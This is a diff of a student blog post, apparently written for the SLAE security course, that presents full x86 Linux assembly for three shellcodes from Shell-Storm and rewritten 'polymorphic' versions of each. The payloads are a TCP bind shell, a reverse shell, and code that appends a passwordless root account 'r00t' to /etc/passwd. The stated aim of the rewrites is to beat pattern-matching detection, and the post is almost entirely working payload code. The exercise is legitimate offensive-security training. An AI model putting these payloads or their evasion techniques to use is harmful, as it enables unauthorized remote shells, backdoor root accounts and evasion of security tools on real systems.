@@ -13,57 +13,448 @@
 <body>
 <div class="container">
 
-<br>
-<br>
+
 <h2> Assignment 6: Polymorphic shellcodes</h2><br>
 <br>
 - Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching<br>
 <br>
-- The polymorphiv versions cannot be larger 150% of the existing shellcode<br>
+- The polymorphic versions cannot be larger 150% of the existing shellcode<br>
 <br>
 - Bonus points for making it shorter in length than original<br>
 <br>
 <br>
 <br>
-<br>
-<br>
 <h2> 6.1 Shellcode "TCP bind shell" </h2><br>
 <br>
-Original size: 108 bytes<br>
+Original size: 	108 bytes<br>
 <br>
-Final size:<br>
+Final size: 	161 bytes (149 %)<br>
 <br>
 Url: http://shell-storm.org/shellcode/files/shellcode-847.php<br>
 <br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a6_Polymorphism/images/1_1.png?raw=true"><br>
 <br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a6_Polymorphism/images/1_2.png?raw=true"><br>
+<br>
+<h4>Original code</h4>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">section .text<br>
+<br>
+global _start<br>
+<br>
+_start:<br>
+<br>
+xor eax,eax<br>
+xor ebx,ebx<br>
+xor ecx,ecx<br>
+xor edx,edx<br>
+mov al,0x66<br>
+mov bl,0x1<br>
+push ecx<br>
+push 0x6<br>
+push 0x1<br>
+push 0x2<br>
+mov ecx,esp<br>
+int 0x80<br>
+mov esi,eax<br>
+mov al,0x66<br>
+mov bl,0x2<br>
+push edx<br>
+push word 0x697a<br>
+push bx<br>
+mov ecx,esp<br>
+push 0x10<br>
+push ecx<br>
+push esi<br>
+mov ecx,esp<br>
+int 0x80<br>
+mov al,0x66<br>
+mov bl,0x4<br>
+push 0x1<br>
+push esi<br>
+mov ecx,esp<br>
+int 0x80<br>
+mov al,0x66<br>
+mov bl,0x5<br>
+push edx<br>
+push edx<br>
+push esi<br>
+mov ecx,esp<br>
+int 0x80<br>
+mov ebx,eax<br>
+xor ecx,ecx<br>
+mov cl,0x3<br>
+<br>
+dupfd:<br>
+dec cl<br>
+mov al,0x3f<br>
+int 0x80<br>
+jne dupfd<br>
+xor eax,eax<br>
+mov al,0xb<br>
+push edx<br>
+push 0x68732f6e<br>
+push 0x69622f2f<br>
+mov ebx,esp<br>
+push edx<br>
+push ebx<br>
+mov ecx,esp<br>
+push edx<br>
+mov edx,esp<br>
+int 0x80<br></code>
+<br>
+<h4>Polymorphic code</h4>
+
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">section .text<br>
+<br>
+global _start<br>
+<br>
+_start:<br>
+xor eax,eax<br>
+xor esi, esi<br>
+add esi, 0x2<br>
+mov al, 0x3<br>
+mul esi<br>
+xor ebx,ebx<br>
+xor eax,eax<br>
+push eax<br>
+push 0x6<br>
+inc edx<br>
+push edx<br>
+inc edx<br>
+push edx<br>
+mov al,0x66<br>
+xor ecx,ecx<br>
+dec edx<br>
+mov ecx,esp<br>
+dec edx<br>
+xor edx,edx<br>
+mov bl,0x1<br>
+push eax<br>
+int 0x80<br>
+mov esi,eax<br>
+mov al,0x64<br>
+inc eax<br>
+mov bl,0x2<br>
+push edx<br>
+inc eax<br>
+xor edi, edi<br>
+push word 0x697a<br>
+inc edi<br>
+inc edi<br>
+push di<br>
+mov bl,0x2<br>
+mov ecx,esp<br>
+mov edi, esi<br>
+push 0x10<br>
+push ecx<br>
+push edi<br>
+inc edi<br>
+mov ecx,esp<br>
+int 0x80<br>
+mul edi<br>
+mov al,0x66<br>
+xor ecx, ecx<br>
+inc ecx<br>
+push ecx<br>
+mov edi, esi<br>
+mov dword [esp-4],esi<br>
+sub esp, 4<br>
+mov ecx,esp<br>
+mov bl,0x3<br>
+inc ebx<br>
+int 0x80<br>
+mov al,0x64<br>
+xor edi,edi<br>
+mov bl,0x6<br>
+push edi<br>
+inc eax<br>
+dec ebx<br>
+push edi<br>
+push esi<br>
+inc edi<br>
+mov ecx,esp<br>
+dec edi<br>
+inc eax<br>
+int 0x80<br>
+mov ebx,eax<br>
+xor ecx,ecx<br>
+mov cl,0x3<br>
+<br>
+test:<br>
+mov al,0x3f<br>
+dec cl<br>
+int 0x80<br>
+jne test<br>
+xor eax,eax<br>
+ror edx, 1<br>
+push edx<br>
+push 0x68732f6e<br>
+rol edx, 1<br>
+push 0x69622f2f<br>
+mov ebx,esp<br>
+cld<br>
+push edx<br>
+inc esi<br>
+push ebx<br>
+mov ecx,esp<br>
+xor eax, eax<br>
+push eax<br>
+mov edx,esp<br>
+mov al,0xb<br>
+int 0x80<br>
+</code>
+<br>
+<br>
+
+
 <h2> 6.2 Shellcode "REVERSE shell"</h2><br>
 <br>
-Original size: 89 bytes<br>
+Original size: 	89 bytes<br>
 <br>
-Final size:<br>
+Final size: 	115 bytes (129 %)<br>
 <br>
 Url: http://shell-storm.org/shellcode/files/shellcode-849.php<br>
 <br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a6_Polymorphism/images/2_1.png?raw=true"><br>
 <br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a6_Polymorphism/images/2_2.png?raw=true"><br>
+<br>
+<h4>Original code</h4>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">section .text<br>
+<br>
+global _start<br>
+<br>
+_start:<br>
+<br>
+xor eax,eax<br>
+xor ebx,ebx<br>
+xor ecx,ecx<br>
+xor edx,edx<br>
+mov al,0x66<br>
+mov bl,0x1<br>
+push ecx<br>
+push 0x6<br>
+push 0x1<br>
+push 0x2<br>
+mov ecx,esp<br>
+int 0x80<br>
+mov esi,eax<br>
+mov al,0x66<br>
+xor ebx,ebx<br>
+mov bl,0x2<br>
+push 0x0<br>
+push word 0x697a<br>
+push bx<br>
+inc bl<br>
+mov ecx,esp<br>
+push 0x10<br>
+push ecx<br>
+push esi<br>
+mov ecx,esp<br>
+int 0x80<br>
+xor ecx,ecx<br>
+mov cl,0x3<br>
+<br>
+dupfd:<br>
+<br>
+dec cl<br>
+mov al,0x3f<br>
+int 0x80<br>
+jne dupfd<br>
+xor eax,eax<br>
+push edx<br>
+push 0x68732f6e<br>
+push 0x69622f2f<br>
+mov ebx,esp<br>
+push edx<br>
+push ebx<br>
+mov ecx,esp<br>
+push edx<br>
+mov edx,esp<br>
+mov al,0xb<br>
+int 0x80<br>
+</code>
+<br>
+<h4>Polymorphic code</h4>
+
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">section .text<br>
+<br>
+global _start<br>
+<br>
+_start:<br>
+<br>
+xor eax,eax<br>
+mov al,0x66<br>
+xor ebx,ebx<br>
+add bl,0x1<br>
+xor ecx,ecx<br>
+mov edx,ecx<br>
+push edx<br>
+add dl, 0x6<br>
+push edx<br>
+sub dl, 0x6<br>
+push ebx<br>
+push 0x2<br>
+mov ecx,esp<br>
+int 0x80<br>
+push eax<br>
+pop esi<br>
+mov al,0x66<br>
+mov ebx,edx<br>
+add bl,0x2<br>
+xor edi, edi<br>
+mov edi, 0x12111190<br>
+sub edi, 0x11111111<br>
+push edi<br>
+push word 0x697a<br>
+push bx<br>
+add bl, 1<br>
+mov ecx,esp<br>
+push 0x10<br>
+push ecx<br>
+push esi<br>
+mov ecx,esp<br>
+int 0x80<br>
+cld<br>
+mov ecx, edx<br>
+mov cl,0x3<br>
+<br>
+test:<br>
+mov al,0x3f<br>
+dec cl<br>
+int 0x80<br>
+jne test<br>
+mov edi, 0x69622f2f<br>
+mov eax,edx<br>
+mov esi, edx<br>
+push esi<br>
+mov esi,0x68732f6e<br>
+push esi<br>
+push edi<br>
+mov ebx,esp<br>
+push eax<br>
+push ebx<br>
+mov ecx,esp<br>
+push edx<br>
+mov al,0xe0<br>
+mov edx,esp<br>
+mov al,0xb<br>
+int 0x80<br>
+</code>
+<br>
+<br>
+
+
+
 <h2> 6.3 Shellcode "Add user r00t in /etc/passwd"</h2><br>
 <br>
-Original size: 69 bytes<br>
+Original size: 	69 bytes<br>
 <br>
-Final size:<br>
+Final size:		99 bytes (143 %)<br>
 <br>
 Url: http://shell-storm.org/shellcode/files/shellcode-211.php<br>
 <br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a6_Polymorphism/images/3_1.png?raw=true"><br>
 <br>
-<h2> 6.4 Shellcode "chmod 0777 /etc/shadow"</h2><br>
+<h4>Original code</h4>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">section .text<br>
 <br>
-Original size: 49 bytes<br>
+global _start<br>
 <br>
-Final size:<br>
+_start:<br>
 <br>
-Url: http://shell-storm.org/shellcode/files/shellcode-875.php<br>
+; open("/etc//passwd", O_WRONLY | O_APPEND)<br>
 <br>
+push byte 5<br>
+pop eax<br>
+xor ecx, ecx<br>
+push ecx<br>
+push 0x64777373<br>
+push 0x61702f2f<br>
+push 0x6374652f<br>
+mov ebx, esp<br>
+mov cx, 02001Q<br>
+int 0x80<br>
 <br>
+mov ebx, eax<br>
 <br>
+; write(ebx, "r00t::0:0:::", 12)<br>
+<br>
+push byte 4<br>
+pop eax<br>
+xor edx, edx<br>
+push edx<br>
+push 0x3a3a3a30<br>
+push 0x3a303a3a<br>
+push 0x74303072<br>
+mov ecx, esp<br>
+push byte 12<br>
+pop edx<br>
+int 0x80<br>
+<br>
+; close(ebx)<br>
+<br>
+push byte 6<br>
+pop eax<br>
+int 0x80<br>
+<br>
+; exit()<br>
+<br>
+push byte 1<br>
+pop eax<br>
+int 0x80<br></code>
+<br>
+<h4>Polymorphic code</h4>
+
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">section .text<br>
+<br>
+global _start<br>
+<br>
+_start:<br>
+xor eax, eax<br>
+xor esi, esi<br>
+push esi<br>
+push 0x64777373<br>
+push 0x61702f2f<br>
+mov al, 5<br>
+push 0x6374652f<br>
+mov ebx, esp<br>
+xor ecx, ecx<br>
+ror edx, 1<br>
+mov cx, 02001Q<br>
+int 0x80<br>
+xor edi, edi<br>
+push eax<br>
+inc esi<br>
+xor eax, eax<br>
+mov al, 4<br>
+dec esi<br>
+pop ebx<br>
+push esi<br>
+mov edi, 0x3a3a3a30<br>
+push edi<br>
+mov edi, 0x3a303a3a<br>
+ror edx, 5<br>
+ror edi, 1<br>
+inc eax<br>
+ror edi,7<br>
+dec eax<br>
+push edi<br>
+xor edx, edx<br>
+mov edx, 0x74303072<br>
+ror edx, 32<br>
+push edx<br>
+mov ecx, esp<br>
+mov dl, 12<br>
+int 0x80<br>
+xor eax, eax<br>
+mul edx<br>
+mov al,6<br>
+int 0x80<br>
+add ecx, 11<br>
+mov al, 1<br>
+int 0x80<br>
+</code>
 <br>
 <br>
 <h2> Note</h2><br>
@@ -72,9 +463,10 @@ This blog post has been created for completing the requirements of the SecurityT
 <br>
 Student ID: SLAE - 1433<br>
 
-<br>
-<br>
+
 
 </div>
 </body>
 </html>
+<br>
+<br>
